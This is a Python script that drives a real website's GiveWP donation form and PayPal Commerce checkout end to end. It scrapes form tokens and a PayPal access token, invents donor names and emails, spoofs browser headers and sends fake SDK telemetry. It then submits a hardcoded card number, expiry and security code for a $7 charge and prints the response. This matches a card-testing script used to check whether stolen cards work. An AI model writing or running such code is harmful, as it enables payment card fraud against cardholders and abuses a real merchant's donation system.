import requests
import re
import time
import json
import random
import base64
from faker import Faker
from user_agent import generate_user_agent

def python():
    first = ["ahmed", "mohamed", "ali", "omar", "youssef", "khaled", "abdullah", "fatma", "sara", "nour", "lina", "maya", "hala", "reem", "salma", "amr", "tarek", "hassan", "ibrahim", "karim"]
    last = ["hassan", "ahmed", "mohamed", "ali", "ibrahim", "khalil", "said", "ramadan", "elmasry", "abdallah", "fathy", "tarek", "mostafa", "adel", "gamal"]
    dom = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com", "protonmail.com", "live.com", "msn.com", "aol.com", "mail.com"]
    
    f = random.choice(first)
    l = random.choice(last)
    n = random.randint(10, 9999)
    
    patterns = [
        f"{f}.{l}{n}",
        f"{f}{l}{n}",
        f"{f}_{l}{n}",
        f"{f}{n}",
        f"{l}.{f}{n}",
        f"{f}{l}.{n}",
        f"{f}.{l}.{n}",
        f"{f}{random.randint(1980, 2005)}"
    ]
    
    return f"{random.choice(patterns)}@{random.choice(dom)}".lower()
    
e = python()
x = Faker()
n = x.name()
r = requests.Session()
u = generate_user_agent()

resp = r.get('https://www.brasscheck.com/video/donate/', headers={'User-Agent': u})
html = resp.text

v1 = re.search(r'name="give-form-id-prefix" value="([^"]+)"', html).group(1)
v2 = re.search(r'name="give-form-id" value="([^"]+)"', html).group(1)
x1 = re.search(r'name="give-form-hash" value="([^"]+)"', html).group(1)
x23 = re.search(r'"data-client-token":"([^"]+)"', html).group(1)

x24 = base64.b64decode(x23).decode()
x25 = json.loads(x24)
x26 = x25['paypal']['accessToken']

headers = {
    'Accept': '*/*',
    'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://www.brasscheck.com',
    'Referer': 'https://www.brasscheck.com/video/donate/',
    'User-Agent': u,
    'X-Requested-With': 'XMLHttpRequest',
}

data = {
    'action': 'give_paypal_commerce_create_order',
    'give-honeypot': '',
    'give-form-id-prefix': v1,
    'give-form-id': v2,
    'give-form-title': 'One time donation',
    'give-current-url': 'https://www.brasscheck.com/video/donate/',
    'give-form-url': 'https://www.brasscheck.com/video/donate/',
    'give-form-minimum': '7',
    'give-form-maximum': '1000000',
    'give-form-hash': x1,
    'give-price-id': 'custom',
    'give-recurring-logged-in-only': '',
    'give-logged-in-only': '1',
    'give_recurring_donation_details': '{"is_recurring":false}',
    'give-amount': '7',
    'give-radio-donation-level': 'custom',
    'give_stripe_payment_method': '',
    'payment-mode': 'paypal-commerce',
    'give_first': n,
    'give_last': n,
    'give_company_option': 'no',
    'give_company_name': '',
    'give_email': e,
    'card_name': n,
    'billing_country': 'US',
    'card_address': 'New york 595',
    'card_address_2': '',
    'card_city': 'New york',
    'card_state': 'NY',
    'card_zip': '10080',
    'give-gateway': 'paypal-commerce',
}

response = r.post('https://www.brasscheck.com/video/wp-admin/admin-ajax.php', headers=headers, data=data)
xdata = (response.json()['data']['id'])

headers = {
    'authority': 'cors.api.paypal.com',
    'accept': '*/*',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'access-control-request-headers': 'authorization,braintree-sdk-version,content-type,paypal-client-metadata-id',
    'access-control-request-method': 'POST',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': u,
}

response = r.options(
    f'https://cors.api.paypal.com/v2/checkout/orders/{xdata}/confirm-payment-source',
    headers=headers,
)

headers = {
    'authority': 'cors.api.paypal.com',
    'accept': '*/*',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer {x26}',
    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': u,
}

json_data = {
    'payment_source': {
        'card': {
            'number': '4315037543493302',
            'expiry': '2030-7',
            'security_code': '238',
            'attributes': {
                'verification': {
                    'method': 'SCA_WHEN_REQUIRED',
                },
            },
        },
    },
    'application_context': {
        'vault': False,
    },
}

response = r.post(
    f'https://cors.api.paypal.com/v2/checkout/orders/{xdata}/confirm-payment-source',
    headers=headers,
    json=json_data,
)

headers = {
    'authority': 'www.paypal.com',
    'accept': '*/*',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'access-control-request-headers': 'content-type',
    'access-control-request-method': 'POST',
    'origin': 'https://www.brasscheck.com',
    'referer': 'https://www.brasscheck.com/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': u,
}

params = {
    'disableSetCookie': 'true',
}

response = r.options('https://www.paypal.com/xoplatform/logger/api/logger', params=params, headers=headers)

headers = {
    'authority': 'www.paypal.com',
    'accept': 'application/json',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://www.brasscheck.com',
    'referer': 'https://www.brasscheck.com/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': u,
}

params = {
    'disableSetCookie': 'true',
}

json_data = {
    'events': [
        {
            'level': 'info',
            'event': 'HOSTEDFIELDS_SUBMIT',
            'payload': {
                'env': 'production',
                'csnwCorrelationId': 'prebuild',
                'referrer': 'www.brasscheck.com',
                'version': '5.0.554',
                'merchantId': [],
                'userAction': 'commit',
                'loadedInFrame': 'non_paypal',
            },
        },
    ],
    'meta': {},
    'tracking': [
        {
            'state_name': 'CARD_PAYMENT_FORM',
            'transition_name': 'process_receive_order',
            'context_type': 'Cart-ID',
            'context_id': xdata,
            'context_correlation_id': 'prebuild',
            'serverside_data_source': 'checkout',
            'feed_name': 'payments_sdk',
            'js_sdk_library': 'paypal-js',
            'locale': 'en_US',
            'pp_placement': 'none',
            'bn_code': 'GiveWP_SP_PPCPV2',
            'referer_url': 'www.brasscheck.com',
            'sdk_integration_source': 'none',
            'sdk_name': 'payments_sdk',
            'sdk_version': '5.0.554',
            'seller_id': '',
            'user_action': 'commit',
            'user_agent': u,
            'loaded_in_frame': 'non_paypal',
        },
    ],
    'metrics': [],
}

response = r.post('https://www.paypal.com/xoplatform/logger/api/logger', params=params, headers=headers, json=json_data)

headers = {
    'Accept': '*/*',
    'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Origin': 'https://www.brasscheck.com',
    'Referer': 'https://www.brasscheck.com/video/donate/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': u,
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

params = {
    'action': 'give_paypal_commerce_approve_order',
    'order': xdata,
}

files = {
    'give-honeypot': (None, ''),
    'give-form-id-prefix': (None, v1),
    'give-form-id': (None, v2),
    'give-form-title': (None, 'One time donation'),
    'give-current-url': (None, 'https://www.brasscheck.com/video/donate/'),
    'give-form-url': (None, 'https://www.brasscheck.com/video/donate/'),
    'give-form-minimum': (None, '7'),
    'give-form-maximum': (None, '1000000'),
    'give-form-hash': (None, x1),
    'give-price-id': (None, 'custom'),
    'give-recurring-logged-in-only': (None, ''),
    'give-logged-in-only': (None, '1'),
    'give_recurring_donation_details': (None, '{"is_recurring":false}'),
    'give-amount': (None, '7'),
    'give-radio-donation-level': (None, 'custom'),
    'give_stripe_payment_method': (None, ''),
    'payment-mode': (None, 'paypal-commerce'),
    'give_first': (None, n),
    'give_last': (None, n),
    'give_company_option': (None, 'no'),
    'give_company_name': (None, ''),
    'give_email': (None, e),
    'card_name': (None, n),
    'card_exp_month': (None, ''),
    'card_exp_year': (None, ''),
    'billing_country': (None, 'US'),
    'card_address': (None, 'New york 595'),
    'card_address_2': (None, ''),
    'card_city': (None, 'New york'),
    'card_state': (None, 'NY'),
    'card_zip': (None, '10080'),
    'give-gateway': (None, 'paypal-commerce'),
}

response = r.post(
    'https://www.brasscheck.com/video/wp-admin/admin-ajax.php',
    params=params,
    cookies=r.cookies,
    headers=headers,
    files=files,
)

print(response.text)